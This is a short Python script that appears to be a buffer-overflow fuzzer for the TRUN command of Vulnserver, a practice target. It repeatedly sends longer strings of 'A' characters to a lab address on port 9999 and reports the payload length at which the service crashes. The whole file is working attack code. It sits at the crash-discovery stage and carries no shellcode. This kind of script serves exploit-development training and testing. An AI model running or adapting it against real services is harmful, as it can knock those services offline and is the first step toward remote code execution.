import socket
import sys
from time import sleep

char_number=100

string_to_send= "/ TRUN.:/" + "A" * char_number

while True:
    try:
        socket1=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket1.connect(("10.0.2.15",9999))
        bytes=string_to_send.encode(encoding="Latin1")
        socket1.send(bytes)
        socket1.close()
        string_to_send=string_to_send+"A" * char_number

        sleep(1)

    except KeyboardInterrupt :
        print(" \nCrashad at : "+str(len(string_to_send)))
        sys.exit()

    except Exception  as e :
        print(" \nCrashad at : "+str(len(string_to_send)))
        print(e)
        sys.exit()
